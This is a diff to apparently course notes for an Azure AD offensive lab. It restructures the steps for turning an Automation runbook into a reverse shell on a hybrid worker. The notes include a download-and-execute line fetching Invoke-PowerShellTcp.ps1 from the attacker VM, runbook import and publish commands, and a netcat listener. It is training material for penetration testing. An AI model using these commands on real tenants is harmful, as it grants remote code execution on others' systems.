@@ -717,15 +717,18 @@ PS C:\AzAD\Tools> Get-AzRoleAssignment -Scope /subscriptions/b413826f-108d-4049-
 PS C:\AzAD\Tools> Get-AzAutomationHybridWorkerGroup -AutomationAccountName HybridAutomation -ResourceGroupName Engineering
 ```
 
-#### Create Runbook
+### Create Runbook
+#### Prep runbook
 
-
-- Import ```C:\AzAD\Tools\studentx.ps1``` as a PowerShell runbook. This script downloads the Invoke-PowerShellTCP.ps1 reverse shell from your student VM and runs on the hybrid worker.
+- We are going to Import a powershell script ```C:\AzAD\Tools\studentx.ps1``` as a PowerShell runbook. This script will download the Invoke-PowerShellTCP.ps1 reverse shell from your student VM (which we are hosting out of ```C:\xampp\htdocs```) and execute on the hybrid worker.
+- The script we will create to be imported as a runbook:
 ```
 iex (New-Object Net.Webclient).downloadstring("http://172.16.x.x:82/Invoke-PowerShellTcp.ps1") Power -Reverse -IPAddress 172.16.x.x -Port 4444
 ```
 
 - Host the ```Invoke-PowerShellTCP.ps1``` by copying it to the ```C:\xampp\htdocs``` and starting Apache using xampp.
+
+#### Import Runbook
 - Run the below command in the PowerShell session where you connected using the access token for Mark. It may take couple of minutes:
 ```
 Import-AzAutomationRunbook -Name studentx -Path C:\AzAD\Tools\studentx.ps1 -AutomationAccountName HybridAutomation -ResourceGroupName Engineering -Type PowerShell -Force -Verbose
@@ -735,7 +738,7 @@ Import-AzAutomationRunbook -Name studentx -Path C:\AzAD\Tools\studentx.ps1 -Auto
 ```
 Publish-AzAutomationRunbook -RunbookName studentx -AutomationAccountName HybridAutomation -ResourceGroupName Engineering -Verbose
 ```
-
+#### Run runbook
 - Start a netcat listener on your student VM. Remember to listen on the port that you specified in the runbook studentx:
 ```
 C:\AzAD\Tools\netcat-win32-1.12\nc.exe -lvp 4444
